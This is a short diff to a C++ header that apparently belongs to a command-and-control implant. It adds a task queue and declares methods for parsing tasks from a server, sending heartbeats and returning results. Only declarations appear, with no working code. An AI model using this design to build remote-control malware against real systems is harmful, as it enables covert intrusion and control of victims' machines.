@@ -11,7 +11,9 @@
 #include <sys/types.h>
 #include <netdb.h>
 #include <asio.hpp>
+#include <queue>
 
+#include "tasks.h"
 #include "net_message.h"
 
 using json = nlohmann::json;
@@ -23,8 +25,12 @@ private:
     bool isRunning;
 
     asio::io_context context;
+    std::queue<Task> taskQueue;
 
     void handleResponse(std::string& data);
+    void parseTasks(const std::string& response);
+    void heartbeat(asio::ip::tcp::socket& socket);
+	[[nodiscard]] std::string sendResults();
 
 public:
     Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning = false);
